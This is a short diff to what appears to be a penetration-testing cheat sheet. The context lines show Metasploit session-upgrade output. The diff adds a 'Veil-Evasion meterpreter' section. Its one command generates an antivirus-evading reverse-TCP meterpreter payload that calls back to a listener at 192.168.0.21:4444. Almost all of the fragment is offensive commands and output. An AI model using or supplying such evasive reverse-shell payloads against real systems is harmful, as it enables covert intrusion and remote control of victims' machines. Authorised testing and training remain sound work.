@@ -42,3 +42,7 @@ msf exploit(handler) > sessions -u 1
 [*] Command stager progress: 99.78% (101888/102108 bytes)
 [*] Command stager progress: 100.00% (102108/102108 bytes)
 ```
+#### Veil-Evasion meterpreter
+```
+veil-evasion -p c/meterpreter/rev_tcp -c LHOST=192.168.0.21 LPORT=4444
+```
